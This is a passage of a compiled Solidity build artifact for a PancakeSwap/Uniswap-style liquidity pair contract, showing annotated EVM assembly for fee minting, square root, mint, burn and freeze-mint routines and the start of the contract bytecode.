*/\n      0x11\n        /* \"src/Pair.sol\":4529:4542  rootK.mul(17) */\n      0xffffffff\n        /* \"src/Pair.sol\":4529:4538  rootK.mul */\n      tag_168\n        /* \"src/Pair.sol\":4529:4542  rootK.mul(17) */\n      and\n      jump\t// in\n    tag_364:\n        /* \"src/Pair.sol\":4529:4546  rootK.mul(17).add */\n      swap1\n        /* \"src/Pair.sol\":4529:4564  rootK.mul(17).add(rootKLast.mul(8)) */\n      0xffffffff\n        /* \"src/Pair.sol\":4529:4546  rootK.mul(17).add */\n      tag_348\n        /* \"src/Pair.sol\":4529:4564  rootK.mul(17).add(rootKLast.mul(8)) */\n      and\n      jump\t// in\n    tag_362:\n        /* \"src/Pair.sol\":4510:4564  uint denominator = rootK.mul(17).add(rootKLast.mul(8)) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4586:4600  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":4615:4626  denominator */\n      dup2\n        /* \"src/Pair.sol\":4603:4612  numerator */\n      dup4\n        /* \"src/Pair.sol\":4603:4626  numerator / denominator */\n      dup2\n      tag_365\n      jumpi\n      invalid\n    tag_365:\n      div\n      swap1\n      pop\n        /* \"src/Pair.sol\":4652:4665  liquidity > 0 */\n      dup1\n      iszero\n        /* \"src/Pair.sol\":4648:4690  if (liquidity > 0) _mint(feeTo, liquidity) */\n      tag_367\n      jumpi\n        /* \"src/Pair.sol\":4667:4690  _mint(feeTo, liquidity) */\n      tag_367\n        /* \"src/Pair.sol\":4673:4678  feeTo */\n      dup8\n        /* \"src/Pair.sol\":4680:4689  liquidity */\n      dup3\n        /* \"src/Pair.sol\":4667:4672  _mint */\n      tag_211\n        /* \"src/Pair.sol\":4667:4690  _mint(feeTo, liquidity) */\n      jump\t// in\n    tag_367:\n        /* \"src/Pair.sol\":4336:4709  if (rootK > rootKLast) {... */\n      pop\n      pop\n      pop\n    tag_358:\n        /* \"src/Pair.sol\":4177:4723  if (_kLast != 0) {... */\n      pop\n      pop\n    tag_354:\n        /* \"src/Pair.sol\":4152:4790  if (feeOn) {... */\n      jump(tag_369)\n    tag_353:\n        /* \"src/Pair.sol\":4743:4754  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/Pair.sol\":4739:4790  if (_kLast != 0) {... */\n      tag_369\n      jumpi\n        /* \"src/Pair.sol\":4778:4779  0 */\n      0x00\n        /* \"src/Pair.sol\":4770:4775  kLast */\n      0x0e\n        /* \"src/Pair.sol\":4770:4779  kLast = 0 */\n      sstore\n        /* \"src/Pair.sol\":4739:4790  if (_kLast != 0) {... */\n    tag_369:\n        /* \"src/Pair.sol\":3903:4796  function _mintFee(... */\n      pop\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n    tag_209:\n        /* \"src/Math.sol\":400:409  uint256 z */\n      0x00\n        /* \"src/Math.sol\":429:430  3 */\n      0x03\n        /* \"src/Math.sol\":425:426  y */\n      dup3\n        /* \"src/Math.sol\":425:430  y > 3 */\n      gt\n        /* \"src/Math.sol\":421:647  if (y > 3) {... */\n      iszero\n      tag_371\n      jumpi\n      pop\n        /* \"src/Math.sol\":450:451  y */\n      dup1\n        /* \"src/Math.sol\":485:486  1 */\n      0x01\n        /* \"src/Math.sol\":481:482  2 */\n      0x02\n        /* \"src/Math.sol\":477:482  y / 2 */\n      dup3\n      div\n        /* \"src/Math.sol\":477:486  y / 2 + 1 */\n      add\n        /* \"src/Math.sol\":500:589  while (x < z) {... */\n    tag_373:\n        /* \"src/Math.sol\":511:512  z */\n      dup2\n        /* \"src/Math.sol\":507:508  x */\n      dup2\n        /* \"src/Math.sol\":507:512  x < z */\n      lt\n        /* \"src/Math.sol\":500:589  while (x < z) {... */\n      iszero\n      tag_374\n      jumpi\n        /* \"src/Math.sol\":536:537  x */\n      dup1\n        /* \"src/Math.sol\":532:537  z = x */\n      swap2\n      pop\n        /* \"src/Math.sol\":573:574  2 */\n      0x02\n        /* \"src/Math.sol\":568:569  x */\n      dup2\n        /* \"src/Math.sol\":564:565  x */\n      dup3\n        /* \"src/Math.sol\":560:561  y */\n      dup6\n        /* \"src/Math.sol\":560:565  y / x */\n      dup2\n      tag_375\n      jumpi\n      invalid\n    tag_375:\n      div\n        /* \"src/Math.sol\":560:569  y / x + x */\n      add\n        /* \"src/Math.sol\":559:574  (y / x + x) / 2 */\n      dup2\n      tag_376\n      jumpi\n      invalid\n    tag_376:\n      div\n        /* \"src/Math.sol\":555:574  x = (y / x + x) / 2 */\n      swap1\n      pop\n        /* \"src/Math.sol\":500:589  while (x < z) {... */\n      jump(tag_373)\n    tag_374:\n        /* \"src/Math.sol\":421:647  if (y > 3) {... */\n      pop\n      jump(tag_378)\n    tag_371:\n        /* \"src/Math.sol\":609:615  y != 0 */\n      dup2\n      iszero\n        /* \"src/Math.sol\":605:647  if (y != 0) {... */\n      tag_378\n      jumpi\n      pop\n        /* \"src/Math.sol\":635:636  1 */\n      0x01\n        /* \"src/Math.sol\":605:647  if (y != 0) {... */\n    tag_378:\n        /* \"src/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n    tag_211:\n        /* \"src/ERC20.sol\":1583:1594  totalSupply */\n      sload(0x00)\n        /* \"src/ERC20.sol\":1583:1605  totalSupply.add(value) */\n      tag_380\n      swap1\n        /* \"src/ERC20.sol\":1599:1604  value */\n      dup3\n        /* \"src/ERC20.sol\":1583:1605  totalSupply.add(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":1583:1598  totalSupply.add */\n      tag_348\n        /* \"src/ERC20.sol\":1583:1605  totalSupply.add(value) */\n      and\n      jump\t// in\n    tag_380:\n        /* \"src/ERC20.sol\":1569:1580  totalSupply */\n      0x00\n        /* \"src/ERC20.sol\":1569:1605  totalSupply = totalSupply.add(value) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":1631:1644  balanceOf[to] */\n      dup4\n      and\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":1631:1640  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":1631:1644  balanceOf[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      tag_381\n      swap1\n        /* \"src/ERC20.sol\":1649:1654  value */\n      dup3\n        /* \"src/ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":1631:1648  balanceOf[to].add */\n      tag_348\n        /* \"src/ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_381:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":1615:1628  balanceOf[to] */\n      dup4\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":1615:1624  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":1615:1628  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":1615:1655  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      dup4\n      mload\n      dup6\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/ERC20.sol\":1615:1628  balanceOf[to] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_218:\n        /* \"src/Math.sol\":192:201  uint256 z */\n      0x00\n        /* \"src/Math.sol\":221:222  y */\n      dup2\n        /* \"src/Math.sol\":217:218  x */\n      dup4\n        /* \"src/Math.sol\":217:222  x < y */\n      lt\n        /* \"src/Math.sol\":217:230  x < y ? x : y */\n      tag_383\n      jumpi\n        /* \"src/Math.sol\":229:230  y */\n      dup2\n        /* \"src/Math.sol\":217:230  x < y ? x : y */\n      jump(tag_384)\n    tag_383:\n        /* \"src/Math.sol\":225:226  x */\n      dup3\n        /* \"src/Math.sol\":217:230  x < y ? x : y */\n    tag_384:\n        /* \"src/Math.sol\":213:230  z = x < y ? x : y */\n      swap4\n        /* \"src/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n    tag_242:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2277:2292  balanceOf[from] */\n      dup3\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2277:2286  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2277:2292  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      tag_386\n      swap1\n        /* \"src/ERC20.sol\":2297:2302  value */\n      dup3\n        /* \"src/ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2277:2296  balanceOf[from].sub */\n      tag_170\n        /* \"src/ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_386:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2259:2274  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2259:2268  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2259:2274  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup2\n      keccak256\n        /* \"src/ERC20.sol\":2259:2303  balanceOf[from] = balanceOf[from].sub(value) */\n      swap2\n      swap1\n      swap2\n      sstore\n        /* \"src/ERC20.sol\":2327:2338  totalSupply */\n      sload\n        /* \"src/ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      tag_387\n      swap1\n        /* \"src/ERC20.sol\":2343:2348  value */\n      dup3\n        /* \"src/ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2327:2342  totalSupply.sub */\n      tag_170\n        /* \"src/ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      and\n      jump\t// in\n    tag_387:\n        /* \"src/ERC20.sol\":2313:2324  totalSupply */\n      0x00\n        /* \"src/ERC20.sol\":2313:2349  totalSupply = totalSupply.sub(value) */\n      swap1\n      dup2\n      sstore\n        /* \"src/ERC20.sol\":2364:2397  Transfer(from, address(0), value) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      and\n      swap2\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap2\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":1714:2190  function freezeMint(... */\n    tag_293:\n        /* \"src/ERC20.sol\":1807:1811  bool */\n      0x00\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":1869:1890  account != address(0) */\n      dup4\n      and\n        /* \"src/ERC20.sol\":1861:1926  require(account != address(0), \"BEP20: mint to the zero address\") */\n      tag_389\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x42455032303a206d696e7420746f20746865207a65726f206164647265737300\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_389:\n        /* \"src/ERC20.sol\":2016:2027  totalSupply */\n      sload(0x00)\n        /* \"src/ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      tag_390\n      swap1\n        /* \"src/ERC20.sol\":2032:2038  amount */\n      dup4\n        /* \"src/ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2016:2031  totalSupply.add */\n      tag_348\n        /* \"src/ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      and\n      jump\t// in\n    tag_390:\n        /* \"src/ERC20.sol\":2002:2013  totalSupply */\n      0x00\n        /* \"src/ERC20.sol\":2002:2039  totalSupply = totalSupply.add(amount) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2075:2098  _frozenBalance[account] */\n      dup5\n      and\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2075:2089  _frozenBalance */\n      0x03\n        /* \"src/ERC20.sol\":2075:2098  _frozenBalance[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      tag_391\n      swap1\n        /* \"src/ERC20.sol\":2103:2109  amount */\n      dup4\n        /* \"src/ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2075:2102  _frozenBalance[account].add */\n      tag_348\n        /* \"src/ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      and\n      jump\t// in\n    tag_391:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2049:2072  _frozenBalance[account] */\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2049:2063  _frozenBalance */\n      0x03\n        /* \"src/ERC20.sol\":2049:2072  _frozenBalance[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":2049:2110  _frozenBalance[account] = _frozenBalance[account].add(amount) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      dup4\n      mload\n      dup7\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/ERC20.sol\":2049:2072  _frozenBalance[account] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n      pop\n        /* \"src/ERC20.sol\":2179:2183  true */\n      0x01\n        /* \"src/ERC20.sol\":1714:2190  function freezeMint(... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n    tag_340:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/UQ112x112.sol\":396:406  uint224(y) */\n      and\n      shl(0x70, 0x01)\n        /* \"src/UQ112x112.sol\":396:413  uint224(y) * Q112 */\n      mul\n      swap1\n        /* \"src/UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n      jump\t// out\n        /* \"src/UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n    tag_341:\n        /* \"src/UQ112x112.sol\":567:576  uint224 z */\n      0x00\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/UQ112x112.sol\":596:606  uint224(y) */\n      dup3\n      and\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/UQ112x112.sol\":592:606  x / uint224(y) */\n      dup5\n      and\n        /* \"src/UQ112x112.sol\":596:606  uint224(y) */\n      dup2\n        /* \"src/UQ112x112.sol\":592:606  x / uint224(y) */\n      tag_394\n      jumpi\n      invalid\n    tag_394:\n      div\n      swap4\n        /* \"src/UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_348:\n        /* \"src/SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"src/SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"src/SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    stop\n    data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c 50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54\n    data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e 556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n    data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544\n    data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8 50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54\n    data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n\n    auxdata: 0xa265627a7a72315820cd5f612284cf3e663022f426c74f2bb28d38659c6e56172357818a55c1bf86f864736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052600680546001600160a01b031916739e94ee69f3cdcd5e74e05563736e4679da6db44c1790556001600f5534801561003b57600080fd5b50604051469080605261280f82396040805191829003605201822082820182526007808452664b4243204c507360c81b6020948501528251808401845260018152603160f81b908501528251808501929092527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe828401527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606083015260808201959095523060a0808301919091528251808303909101815260c090910190915280519101206004555080546001600160a01b031916331790556126ea806101256000396000f3fe608060405234801561001057600080fd5b50600436106101e55760003560e01c806370a082311161010f578063bc25cf77116100a2578063dcbbb37311610071578063dcbbb373146105ff578063dd62ed3e14610625578063f317739c14610653578063fff6cae91461065b576101e5565b8063bc25cf7714610578578063c45a01551461059e578063d21220a7146105a6578063d505accf146105ae576101e5565b8063900820d8116100de578063900820d81461053457806395d89b411461053c578063a9059cbb14610544578063ba9a7a5614610570576101e5565b806370a08231146104a15780637464fc3d146104c75780637ecebe00146104cf57806389afcb44146104f5576101e5565b806323b872dd1161018757806347d5d8561161015657806347d5d856146104455780635909c0d51461046b5780635a3d5493146104735780636a6278421461047b576101e5565b806323b872dd146103e157806330adf81f14610417578063313ce5671461041f5780633644e5151461043d576101e5565b8063095ea7b3116101c3578063095ea7b31461032d5780630dfe16811461036d5780631794bb3c1461039157806318160ddd146103c7576101e5565b8063022c0d9f146101ea57806306fdde03146102785780630902f1ac146102f5575b600080fd5b6102766004803603608081101561020057600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561023757600080fd5b82018360208201111561024957600080fd5b8035906020019184600183028401116401000000008311171561026b57600080fd5b509092509050610663565b005b610280610c17565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102ba5781810151838201526020016102a2565b50505050905090810190601f1680156102e75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102fd610c3a565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b6103596004803603604081101561034357600080fd5b506001600160a01b038135169060200135610c64565b604080519115158252519081900360200190f35b610375610c7b565b604080516001600160a01b039092168252519081900360200190f35b610276600480360360608110156103a757600080fd5b506001600160a01b03813581169160208101359091169060400135610c8a565b6103cf610d13565b60408051918252519081900360200190f35b610359600480360360608110156103f757600080fd5b506001600160a01b03813581169160208101359091169060400135610d19565b6103cf610db3565b610427610dd7565b6040805160ff9092168252519081900360200190f35b6103cf610ddc565b6103cf6004803603602081101561045b57600080fd5b50356001600160a01b0316610de2565b6103cf610df4565b6103cf610dfa565b6103cf6004803603602081101561049157600080fd5b50356001600160a01b0316610e00565b6103cf600480360360208110156104b757600080fd5b50356001600160a01b03166110fe565b6103cf611110565b6103cf600480360360208110156104e557600080fd5b50356001600160a01b0316611116565b61051b6004803603602081101561050b57600080fd5b50356001600160a01b0316611128565b6040805192835260208301919091528051918290030190f35b6103756114cc565b6102806114db565b6103596004803603604081101561055a57600080fd5b506001600160a01b0381351690602001356114fd565b6103cf61150a565b6102766004803603602081101561058e57600080fd5b50356001600160a01b0316611510565b610375611679565b610375611688565b610276600480360360e08110156105c457600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611697565b6103cf6004803603602081101561061557600080fd5b50356001600160a01b0316611897565b6103cf6004803603604081101561063b57600080fd5b506001600160a01b0381358116916020013516611ae6565b6103cf611b03565b610276611b09565b600f546001146106ac576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55841515806106bf5750600084115b6106fa5760405162461bcd60e51b815260040180806020018281038252602381526020018061266d6023913960400191505060405180910390fd5b600080610705610c3a565b5091509150816001600160701b03168710801561072a5750806001600160701b031686105b61077b576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008080606460058b02048a0390506000606460058b02600854600954929091048c0392506001600160a01b03908116918116908b1682148015906107d25750806001600160a01b03168b6001600160a01b031614155b610819576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561082a5761082a828c86611c69565b8b1561083b5761083b818c85611c69565b88156108f6578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b1580156108dd57600080fd5b505af11580156108f1573d6000803e3d6000fd5b505050505b606460058e810282900491908e02048e15610923576006546109239085906001600160a01b031684611c69565b8d15610941576006546109419084906001600160a01b031683611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b15801561098757600080fd5b505afa15801561099b573d6000803e3d6000fd5b505050506040513d60208110156109b157600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b1580156109fd57600080fd5b505afa158015610a11573d6000803e3d6000fd5b505050506040513d6020811015610a2757600080fd5b505196506000955050505050506001600160701b0385168a90038311610a4e576000610a5d565b89856001600160701b03160383035b9050600089856001600160701b0316038311610a7a576000610a89565b89856001600160701b03160383035b90506000821180610a9a5750600081115b610ad55760405162461bcd60e51b81526004018080602001828103825260228152602001806125dd6022913960400191505060405180910390fd5b6000610b09610aeb84601963ffffffff611e0316565b610afd8761271063ffffffff611e0316565b9063ffffffff611e6616565b90506000610b21610aeb84601963ffffffff611e0316565b9050610b536305f5e100610b476001600160701b038b8116908b1663ffffffff611e0316565b9063ffffffff611e0316565b610b63838363ffffffff611e0316565b1015610ba3576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610bb184848888611eb6565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001600f55505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610c71338484612079565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610cde576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610d9e576001600160a01b0384166000908152600260209081526040808320338452909152902054610d79908363ffffffff611e6616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610da98484846120db565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b6000600f54600114610e4b576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580610e5b610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610eaf57600080fd5b505afa158015610ec3573d6000803e3d6000fd5b505050506040513d6020811015610ed957600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610f2c57600080fd5b505afa158015610f40573d6000803e3d6000fd5b505050506040513d6020811015610f5657600080fd5b505190506000610f75836001600160701b03871663ffffffff611e6616565b90506000610f92836001600160701b03871663ffffffff611e6616565b90506000610fa08787612183565b60005490915080610fdd57610fc96103e8610afd610fc4878763ffffffff611e0316565b6122f6565b9850610fd860006103e8612348565b61102c565b6110296001600160701b038916610ffa868463ffffffff611e0316565b8161100157fe5b046001600160701b03891661101c868563ffffffff611e0316565b8161102357fe5b046123cc565b98505b6000891161106b5760405162461bcd60e51b81526004018080602001828103825260268152602001806126906026913960400191505060405180910390fd5b6110758a8a612348565b61108186868a8a611eb6565b81156110b157600b546110ad906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a250506001600f5550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080600f54600114611174576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580611184610c3a565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b1580156111e057600080fd5b505afa1580156111f4573d6000803e3d6000fd5b505050506040513d602081101561120a57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561125857600080fd5b505afa15801561126c573d6000803e3d6000fd5b505050506040513d602081101561128257600080fd5b5051306000908152600160205260408120549192506112a18888612183565b600054909150806112b8848763ffffffff611e0316565b816112bf57fe5b049a50806112d3848663ffffffff611e0316565b816112da57fe5b04995060008b1180156112ed575060008a115b6113285760405162461bcd60e51b81526004018080602001828103825260268152602001806126276026913960400191505060405180910390fd5b61133230846123e4565b61133d878d8d611c69565b611348868d8c611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561138e57600080fd5b505afa1580156113a2573d6000803e3d6000fd5b505050506040513d60208110156113b857600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b15801561140457600080fd5b505afa158015611418573d6000803e3d6000fd5b505050506040513d602081101561142e57600080fd5b5051935061143e85858b8b611eb6565b811561146e57600b5461146a906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001600f81905550915091565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610c713384846120db565b6103e881565b600f54600114611559576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116089285928792611603926001600160701b03169185916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b505afa1580156115df573d6000803e3d6000fd5b505050506040513d60208110156115f557600080fd5b50519063ffffffff611e6616565b611c69565b600b54604080516370a0823160e01b8152306004820152905161166f9284928792611